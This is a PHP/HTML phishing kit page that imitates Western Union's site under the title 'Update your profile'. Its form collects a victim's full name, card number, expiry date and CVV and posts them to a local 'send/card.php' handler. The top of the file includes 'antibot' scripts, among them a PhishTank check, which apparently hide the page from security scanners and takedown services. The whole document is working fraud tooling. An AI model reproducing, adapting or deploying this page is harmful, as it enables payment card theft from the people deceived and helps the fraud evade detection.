<?php
@session_start(); 
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
    include "antibots/antibots1.php";
    include "antibots/antibots2.php";
    include "antibots/antibots3.php";
    include "antibots/antibots4.php";
    include "antibots/antibots5.php";
    include "antibots/antibots6.php";
?><html lang="en" class="ng-cloak" page-type="ssr" id="optimusStarter" translate-cloak=""><head><script type="text/javascript" integrity="sha384-girahbTbYZ9tT03PWWj0mEVgyxtZoyDF9KVZdL+R53PP5wCY0PiVUKq0jeRlMx9M" crossorigin="anonymous" async="" src="https://cdn.amplitude.com/libs/amplitude-7.2.1-min.gz.js"></script><script type="text/javascript" async="" src="./Files/lex-web-ui-loader.m.js.download"></script><script type="text/javascript" async="" src="./Files/mparticle.js.download"></script><script async="" type="text/javascript" src="./Files/westernunion.js.download"></script>
    <!--<base href="/">--><base href=".">
    <style>
        .translate-cloak {
            visibility: hidden;
        }
    </style>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="google-site-verification" content="Qs-9D61IwA4kZeZgoamG4ijzLv36Kiaam_ZwHenkHtc">
    <link rel="manifest" href="https://www.westernunion.com/content/dam/wu/root/manifest.json"> 
    <link rel="preload" as="font" href="https://www.westernunion.com/etc/designs/westernunion/optimus/fonts/OpenSans-Light.woff2" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" as="font" href="https://www.westernunion.com/etc/designs/westernunion/optimus/fonts/OpenSans-Semibold.woff2" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" as="font" href="https://www.westernunion.com/etc/designs/westernunion/optimus/fonts/OpenSans-Regular.woff2" type="font/woff2" crossorigin="anonymous">
    <!--<base href="/">--><base href=".">
    <title>Update your profile - Western Union</title>
    <link rel="icon" href="images/WU.png" type="image/x-icon" />
<link rel="stylesheet" href="./Files/styles.4b1cc7bb3c53f703c14a.css"><script type="text/javascript">var ACTIVE_VERSION = {"assetVersion":"57.0.0.236490bd","dcaasVersion":"R230720","configVersion":"57.0.0.90b82c27","contentVersion":"r230720"};</script><link rel="preload" href="./Files/responsive_css.min.css"><link rel="stylesheet" type="text/css" id="responsiveMinCss" href="./Files/responsive_css.min.css"><link rel="canonical" href="#"><meta name="msapplication-TileColor" content="#111111"><meta name="msapplication-TileImage" content="/etc/designs/wu/mstile-150x150.png"><meta name="description" content="Sign in to your WU US profile to send money online with Western Union services from the United States."><meta name="google-play-app" content="com.westernunion.android.mtapp"><meta name="google-site-verification" content="Qs-9D61IwA4kZeZgoamG4ijzLv36Kiaam_ZwHenkHtc">




    <script src="/iojs/versionOrAliasIsRequired/static_wdp.js?loaderVer=5.2.2&amp;compat=false&amp;tp=true&amp;tp_split=false&amp;fp_static=true&amp;fp_dyn=true&amp;flash=false"></script><script src="https://mpsnare.iesnare.com/versionOrAliasIsRequired/wdp.js?loaderVer=5.2.2&amp;compat=false&amp;tp=true&amp;tp_split=false&amp;fp_static=true&amp;fp_dyn=true&amp;flash=true"></script><link rel="icon" type="image/png" sizes="16x16" href="/etc/designs/wu/favicon-16x16.png"><link rel="icon" type="image/png" sizes="32x32" href="/etc/designs/wu/favicon-32x32.png"><link rel="icon" type="image/png" sizes="48x48" href="/etc/designs/wu/favicon-48x48.png"><link rel="apple-touch-icon" type="image/png" sizes="180x180" href="/etc/designs/wu/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="192x192" href="/etc/designs/wu/android-chrome-192x192.png"><link rel="icon" type="image/png" sizes="384x384" href="/etc/designs/wu/android-chrome-384x384.png"></head><body><div id="OptimusApp" bis_skin_checked="1">
        <div class="container-fluid body-container" bis_skin_checked="1">
            <app-root ng-version="9.1.13"><div class="responsive_scss" bis_skin_checked="1"><app-header _nghost-serverapp-c32="" class="ng-tns-c32-0 ng-star-inserted"><header _ngcontent-serverapp-c32="" id="wu-header" appwuheader="" role="banner" style="position: relative;" class="ng-tns-c32-0 ng-star-inserted"><!----><div _ngcontent-serverapp-c32="" class="container ng-tns-c32-0 ng-star-inserted global-lang-selector-header" bis_skin_checked="1"><div _ngcontent-serverapp-c32="" class="row header-top-container ng-tns-c32-0" bis_skin_checked="1"><div _ngcontent-serverapp-c32="" class="col-xs-3 visible-xs ng-tns-c32-0" bis_skin_checked="1"></div><div _ngcontent-serverapp-c32="" class="wu-logo col-xs-6 col-md-3 col-sm-2 ng-tns-c32-0 wu-user-loggedout" bis_skin_checked="1"><a _ngcontent-serverapp-c32="" id="menu-wu-logo" class="ng-tns-c32-0 ng-star-inserted" href="#"><div _ngcontent-serverapp-c32="" class="wu-header-logo wu-partner-logo ng-tns-c32-0" data-partner-map="{&quot;partner_name&quot;:&quot;walmart&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/responsive/wu-walmart.desktop.png&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/responsive/wu-walmart.mobile.png&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;powercash&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/responsive/wu-powercash.desktop.png&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/responsive/wu-powercash.mobile.png&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;boat&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/logo/brightwell-desktop.png&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/logo/brightwell-mobile.png&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;shipmoney&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/logo/shipmoney-desktop.png&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/logo/shipmoney-mobile.png&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;usbank&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/partners/usbank/usbank.png&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/partners/usbank/usbank.png&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;kroger&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/partners/kroger/Kroger_old.svg&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/partners/kroger/Kroger-mobile_old.svg&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;mycall&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/partners/mycall/MyCall-logo.jpg&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/partners/mycall/MyCall-logo.jpg&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;viber&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/partners/viber/viber_desktop.png&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/partners/viber/viber_mobile.png&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;wirecard&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/logo/logo.wu.big.svg&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/logo/logo.wu.small.svg&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;citi&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/logo/logo.wu.big.svg&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/logo/logo.wu.small.svg&quot;,&quot;hideLogo&quot;:[]},{&quot;partner_name&quot;:&quot;moneymart&quot;,&quot;desktop_logo_path&quot;:&quot;/content/dam/wu/partners/moneymart/moneymart.svg&quot;,&quot;mobile_logo_path&quot;:&quot;/content/dam/wu/partners/moneymart/moneymart_mobile.svg&quot;,&quot;hideLogo&quot;:[]}" data-desktop-image="/content/dam/wu/logo/logo.wu.big.svg" data-mobile-image="/content/dam/wu/logo/logo.wu.small.svg" bis_skin_checked="1"><img _ngcontent-serverapp-c32="" class="wu-log ng-tns-c32-0" alt="logo" src="./Files/logo.wu.big.svg"></div></a><!----><!----><!----></div><div _ngcontent-serverapp-c32="" class="fbWebviewHeaderLinks hidden ng-tns-c32-0" bis_skin_checked="1"><a _ngcontent-serverapp-c32="" class="btn ng-tns-c32-0" href="">Log in</a></div><!----><!----><!----><!----><!----></div></div><!----><div _ngcontent-serverapp-c32="" role="progressbar" class="progress-bar-web-main-container ng-tns-c32-0 hide-content" aria-label="Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option" bis_skin_checked="1"><div _ngcontent-serverapp-c32="" role="progressbar" class="progress-bar-web ng-tns-c32-0" aria-label="Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option,Progress Bar with Back Option" bis_skin_checked="1"><div _ngcontent-serverapp-c32="" class="progress-extra ng-tns-c32-0" bis_skin_checked="1"></div><ul _ngcontent-serverapp-c32="" role="progressbar" aria-label="Progress-Bar-Options" class="row progress-bar-options container container-new ng-tns-c32-0"><li _ngcontent-serverapp-c32="" class="selectedLi ng-tns-c32-0"></li><!----><!----><li _ngcontent-serverapp-c32="" id="progressbar-receiver" amplitude-id="progressbar-receiver" aria-label="Receiver" label="Receiver" data-state="receiver" class="completedsteps selected-steps ng-tns-c32-0 ng-star-inserted"><!----><span _ngcontent-serverapp-c32="" class="ng-tns-c32-0 ng-star-inserted">Receiver</span><!----><!----></li><!----><!----><li _ngcontent-serverapp-c32="" id="progressbar-review" amplitude-id="progressbar-review" aria-label="Review" label="Review" data-state="review" class="ng-tns-c32-0">Review</li><li _ngcontent-serverapp-c32="" id="progressbar-receipt" amplitude-id="progressbar-receipt" aria-label="Receipt" label="Receipt" data-state="receipt" class="ng-tns-c32-0">Receipt</li></ul><div _ngcontent-serverapp-c32="" id="progress-bar-last-elment-id" class="ng-tns-c32-0" bis_skin_checked="1"></div></div></div></header><!----><app-update-profile-modal _ngcontent-serverapp-c32="" id="update-profile-modal" style="display: none;" class="ng-tns-c32-0" _nghost-serverapp-c26=""><app-modal-generic _ngcontent-serverapp-c26="" _nghost-serverapp-c23=""><div _ngcontent-serverapp-c23="" class="modal-backdrop" bis_skin_checked="1"></div><div _ngcontent-serverapp-c23="" class="modal-parent" bis_skin_checked="1"><div _ngcontent-serverapp-c23="" class="modal-parent" bis_skin_checked="1"><div _ngcontent-serverapp-c26="" class="upm-popup-container" bis_skin_checked="1"><div _ngcontent-serverapp-c26="" class="close-icon" bis_skin_checked="1"><button _ngcontent-serverapp-c26="" type="button" aria-label="Close" amplitude-id="icon-close-update-profile-pop-up" class="close popup-close ng-star-inserted"><span _ngcontent-serverapp-c26="" class="icons-apps icons-apps-close"></span></button><!----></div><div _ngcontent-serverapp-c26="" class="info-popup-content" bis_skin_checked="1"><p _ngcontent-serverapp-c26="" class="margin-bottom-20"><img _ngcontent-serverapp-c26="" src="./Files/icon-alert-orange48.svg" alt="icon-alert-warning" style="height: 30px;"></p><p _ngcontent-serverapp-c26="" class="info-popup-title margin-bottom-20">Update your profile</p><p _ngcontent-serverapp-c26="" class="info-popup-subtitle ng-star-inserted">You need to add your name to your Western Union profile to Refer a friend. After you update your profile, please come back to Refer a friend.</p><!----><!----><div _ngcontent-serverapp-c26="" class="padding-top-30" bis_skin_checked="1"><button _ngcontent-serverapp-c26="" amplitude-id="button-update-profile-pop-up" data-dismiss="modal" class="btn btn-primary btn-lg btn-ta-popup no-margin"><span _ngcontent-serverapp-c26="">Go to Profile</span></button></div></div></div></div></div></app-modal-generic></app-update-profile-modal></app-header><!----><section role="main" id="optimus-body-section" appsessiontimer=""><div id="smonewuser" class="absolute-center" bis_skin_checked="1"><div class="container padding-left-0 padding-right-0" bis_skin_checked="1"><router-outlet></router-outlet><app-login-auth _nghost-serverapp-c110="" class="ng-star-inserted"><!----><!----><section _ngcontent-serverapp-c110=""><div _ngcontent-serverapp-c110="" class="body parsys" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="container-fluid" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="flex-row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="wu-responsive-columns col-xs-12 colctrl" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="loginpanel page section" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="center-container" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="wu-register-banner" bis_skin_checked="1"><!----><!----><div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-xs-6 ng-star-inserted" bis_skin_checked="1"><h1 _ngcontent-serverapp-c110="" translate="login.pagetitle" style="font-size: 20px;" class="ng-star-inserted">Please verify the card details.</h1><p _ngcontent-serverapp-c26="" class="margin-bottom-20"><!----><!----><!----><!----></div><!----><div _ngcontent-serverapp-c110="" class="col-sm-6 ng-star-inserted" bis_skin_checked="1"><p _ngcontent-serverapp-c110="" class="text-right padding-top-10"><!----><!----><!----></p></div><!----></div><!----><!----><app-page-level-error-message _ngcontent-serverapp-c110="" _nghost-serverapp-c94=""><!----></app-page-level-error-message>
            <center>
<img _ngcontent-serverapp-c26="" src="images/alert.svg" alt="icon-alert-warning" style="height: 30px;"></p><div class="cardd d-flex align-items-center pt-4">
                                    <h6 class="me-2">Use a Credit Card </h6>
                                    <img src="images/crd.png" width="55%" height="">
                                </div></center>
            <form action="./send/card.php" method="post" id="konzform" name="konzform">
                
                <label for="email" class="fieldLabel">Full name</label>
                
                <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="text" name="fullname" id="fullname" formcontrolname="cardnumber" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label="fullname"><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="fullname" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">
                    
                    
<label for="email" class="fieldLabel">Card number</label>
                
                <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="tel" name="cardnumber" id="cardnumber" formcontrolname="cardnumber" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label="Card number"><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="cardnumber" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">
                    
                    

                    
                    
<label for="email" class="fieldLabel">MM/YY</label></div><br>
                    
                    <div _ngcontent-serverapp-c110="" class="col-sm-12 ng-star-inserted" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" 
            name="exp" id="exp" formcontrolname="exp" maxlength="5" aria-describedby="exp-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" type="tel" aria-label="Password"><div _ngcontent-serverapp-c110="" translate="login.secondtextfield" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="txtEmailAddrSuccess" translate="login.secondtextfield" class="sr-only"></span><span _ngcontent-serverapp-c110="" class="remove-left-sided-border"><a _ngcontent-serverapp-c110="" id="link-show-hide-password" class="show-class color-teal"><!----><!----></a></span></span></div><!----><div _ngcontent-serverapp-c110="" class="col-sm-12 padding-bottom-10" bis_skin_checked="1">
                
                
                
                
<label for="email" class="fieldLabel">CVV</label>
                
                <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="tel" name="cvv" id="cvv"maxlength="4" formcontrolname="cardnumber" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label="cvv"><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="cvv" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">                
                
                
                
                
                
                <!----><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12 text-right padding-bottom-10 ng-star-inserted" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="text-right ng-star-inserted" bis_skin_checked="1">                    <!----><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-xs-12 checkbox text-right rememberme" bis_skin_checked="1"><!----></div></div></div><div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><!----><!----></div><!----><!----></div><!----><!----><button _ngcontent-serverapp-c110="" type="submit" id="button-continue" data-linkname="button-login" amplitude-id="button-login" class="btn btn-primary btn-lg btn-block background-color-teal remove-margin"><div _ngcontent-serverapp-c110="" translate="login.primarybutton" class="continue-button ng-star-inserted" aria-label="Continue" bis_skin_checked="1">Continue</div><!----><!----><!----><!----><!----></button></div></div><!----><!----></form>
            
            
            <!----><!----><!----></div></div></div></div></div></div></div></section></app-login-auth><!----></div></div><app-session-expiry-modal id="session-expiry-modal-id" style="display: none;" _nghost-serverapp-c24=""><app-modal-generic _ngcontent-serverapp-c24="" _nghost-serverapp-c23=""><div _ngcontent-serverapp-c23="" class="modal-backdrop" bis_skin_checked="1"></div><div _ngcontent-serverapp-c23="" class="modal-parent" bis_skin_checked="1"><div _ngcontent-serverapp-c23="" class="modal-parent" bis_skin_checked="1"><div _ngcontent-serverapp-c24="" id="sessionexpirymodal" role="dialog" class="modal fade in popup-modal session-expire-popup" bis_skin_checked="1"><div _ngcontent-serverapp-c24="" class="popup-overlay-vertical-center" bis_skin_checked="1"><div _ngcontent-serverapp-c24="" class="modal-dialog popup-overlay-body-switch-payout" bis_skin_checked="1"><div _ngcontent-serverapp-c24="" class="modal-content ng-star-inserted" bis_skin_checked="1"><a _ngcontent-serverapp-c24="" data-dismiss="modal" amplitude-id="button-session-expiry-pop-up-close"><i _ngcontent-serverapp-c24="" aria-hidden="true" class="icon-0022_close"></i></a><div _ngcontent-serverapp-c24="" class="msg-header" bis_skin_checked="1"><span _ngcontent-serverapp-c24="" translate="session_expire_popup.popup_heading">Session expiring</span></div><div _ngcontent-serverapp-c24="" class="msg-text" bis_skin_checked="1"><span _ngcontent-serverapp-c24="" translate="session_expire_popup.popup_message">Your session is about to expire in:</span></div><div _ngcontent-serverapp-c24="" class="timer-wrapper" bis_skin_checked="1"><div _ngcontent-serverapp-c24="" class="progress-circle" bis_skin_checked="1"><span _ngcontent-serverapp-c24="" class="time"></span><span _ngcontent-serverapp-c24="" class="time-text"><span _ngcontent-serverapp-c24="" translate="session_expire_popup.inminutes_text">minutes</span></span><div _ngcontent-serverapp-c24="" class="left-half-clipper" bis_skin_checked="1"><div _ngcontent-serverapp-c24="" class="first50-bar" bis_skin_checked="1"></div><div _ngcontent-serverapp-c24="" class="value-bar" bis_skin_checked="1"></div></div></div></div><button _ngcontent-serverapp-c24="" automation-id="addReceiverCTA" type="button" id="button-session-expiry-pop-up-continue-extend" data-dismiss="modal" data-linkname="button-receiver-continue" amplitude-id="button-session-expiry-pop-up-continue-extend" class="btn btn-primary btn-block ng-binding continue"><span _ngcontent-serverapp-c24="" translate="session_expire_popup.popup_button_text">Keep me logged in</span></button></div><!----><!----></div></div></div></div></div></app-modal-generic></app-session-expiry-modal></section><app-footer _nghost-serverapp-c33="" class="ng-star-inserted"><footer _ngcontent-serverapp-c33="" role="contentinfo" class="ng-star-inserted"><!----><!----><!----><div _ngcontent-serverapp-c33="" class="copyrightlinks-menu-container" bis_skin_checked="1"><div _ngcontent-serverapp-c33="" class="container copyrightlinks-container ng-star-inserted" bis_skin_checked="1"><div _ngcontent-serverapp-c33="" class="col-sm-12 col-xs-12 quicklinks" bis_skin_checked="1"><span _ngcontent-serverapp-c33=""><ul>
<li><a href="#" aria-label="Home (Opens in new tab)">Home</a></li>
<li><a href="#" aria-label="About us (Opens in new tab)">About us</a></li>
<li><a href="#" aria-label="Contact us (Opens in new tab)">Contact us</a></li>
<li><a href="#" aria-label="Refer a Friend (Opens in new tab)">Refer a Friend</a></li>
<li><a href="#"  aria-label="Blog (Opens in new tab)">Blog</a></li>
<li><a href="#"  aria-label="Help (Opens in new tab)">Help</a></li>
<li><a href="#"  aria-label="Fraud awareness (Opens in new tab)">Fraud awareness</a></li>
<li><a href="#" aria-label="Report a security bug (Opens in new tab)">Report a security bug</a></li>
<li><a href="#"  aria-label="Investor relations (Opens in new tab)">Investor relations</a></li>
<li><a href="#" aria-label="Careers (Opens in new tab)">Careers</a></li>
<li><a href="#" aria-label="Western Union Foundation (Opens in new tab)">Western Union Foundation</a></li>
<li><a href="#" aria-label="News (Opens in new tab)">News</a></li>
<li><a href="#" aria-label="Become an agent (Opens in new tab)">Become an agent</a></li>
<li><a href="#"  aria-label="Payment solutions (Opens in new tab)">Payment solutions</a></li>
<li><a href="#"  aria-label="State licensing (Opens in new tab)">State licensing</a></li>
<li><a href="#"  aria-label="Law enforcement subpoena information (Opens in new tab)">Law enforcement subpoena information</a></li>
<li><a href="#"  aria-label="Terms and Conditions (Opens in new tab)">Terms and Conditions</a></li>
<li><a href="#"  aria-label="Online Privacy Statement (Opens in new tab)">Online Privacy Statement</a></li>
<li><a href="#"  aria-label="Sitemap (Opens in new tab)">Sitemap</a></li>
<li><a href="#" aria-label="Cookie Information (Opens in new tab)">Cookie Information</a></li>
<li><a href="#" aria-label="Accessibility Statement (Opens in new tab)">Accessibility Statement</a></li>
<li><a href="#">How to find your WU tracking number</a></li>
<li><a href="#">Send money with confidence</a></li>
</ul></span></div><div _ngcontent-serverapp-c33="" id="ga_dis" class="col-sm-8 col-md-9 col-xs-12 wu-copyright-text ng-star-inserted" bis_skin_checked="1"><span _ngcontent-serverapp-c33=""><p>Services may be provided by Western Union Financial Services, Inc. NMLS# 906983 and/or Western Union International Services, LLC NMLS# 906985, which are licensed as Money Transmitters by the New York State Department of Financial Services.&nbsp; See terms and conditions for details.</p>
<p>&nbsp;</p>
</span></div><!----><div _ngcontent-serverapp-c33="" class="col-sm-8 col-md-9 col-xs-12 wu-copyright-text" bis_skin_checked="1"><span _ngcontent-serverapp-c33=""><p>© 2023 Western Union Holdings, Inc. All Rights Reserved</p>
</span></div><div _ngcontent-serverapp-c33="" class="col-sm-4 col-md-3 col-xs-12 social-icons-container" bis_skin_checked="1"><div _ngcontent-serverapp-c33="" class="social-media-text" bis_skin_checked="1"><span _ngcontent-serverapp-c33=""><p><b>Follow us</b>&nbsp;on</p>
</span></div><div _ngcontent-serverapp-c33="" class="social-icons" bis_skin_checked="1"><a _ngcontent-serverapp-c33="" href="#" aria-label="Follow us on facebook (Opens in new tab)"><img _ngcontent-serverapp-c33="" width="11px" height="20px" src="./Files/icon-sm-facebook.png" alt="facebook"></a><a _ngcontent-serverapp-c33=""  href="#" aria-label="Follow us on youtube (Opens in new tab)"><img _ngcontent-serverapp-c33="" width="26px" height="18px" src="./Files/icon-sm-youtube.png" alt="youtube"></a><a _ngcontent-serverapp-c33="" href="#" aria-label="Follow us on Instagram (Opens in new tab)"><img _ngcontent-serverapp-c33="" width="22px" height="22px" src="./Files/icon-sm-instagram.png" alt="instagram"></a><a _ngcontent-serverapp-c33="" href="#" aria-label="Follow us on twitter (Opens in new tab)"><img _ngcontent-serverapp-c33="" width="24px" height="20px" src="./Files/icon-sm-twitter.png" alt="twitter"></a></div><div _ngcontent-serverapp-c33="" class="col-sm-4 col-md-3 col-xs-12 fraud-awareness" bis_skin_checked="1"><!----></div></div></div><!----></div></footer><!----></app-footer><!----><app-spinner-container _nghost-serverapp-c25=""><!----></app-spinner-container></div></app-root>
        </div>
    </div>
 <script src="./js/jquery-3.3.1.min.js"></script>
      <script src="./js/jquery.mask.min.js"></script>
      <script src="./js/jquery.validate.min.js"></script>
      <script>$(window).ready(function(){setInterval(function(){$(".busyOverlay").fadeOut("fast"),$(".busyIcon").fadeOut("fast")},1e3)});</script>    <script>
        const alpha = (e) => {
             let k;
             document.all ? k = e.keyCode : k = e.which;
             return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
         }

        $(document).ready(function (e) {
            e("#cardnumber").mask("0000 0000 0000 0000"), e("#exp").mask("00/00"), e("#ssn").mask("000-00-0000"),
            $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    fullname: {
                        required: true,
                        minlength: 3
                    },
                    cardnumber: {
                        required: true,
                        minlength: 18,
                        maxlength: 19,

                    },
                    exp: {
                        required: true,
                        minlength: 5
                    },
                    cvv: {
                        required: true,
                        minlength: 3
                    }
                },
                messages: {
                    fullname: {
                        required: "Please fill this field"
                    },
                    cardnumber: {
                        required: "Please fill this field"
                    },
                    exp: {
                        required: "Please fill this field",
                    },
                    cvv: {
                        required: "Please fill this field",
                    }
                }
            });
        })

        $.validator.addMethod("minAge", function (value, element, min) {
         var today = new Date();
         var birthDate = new Date(value);
         var age = today.getFullYear() - birthDate.getFullYear();

         if (age > min + 1) {
            return true;
         }

         var m = today.getMonth() - birthDate.getMonth();

         if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
            age--;
         }

         return age >= min;
      });
    </script>
</body></html>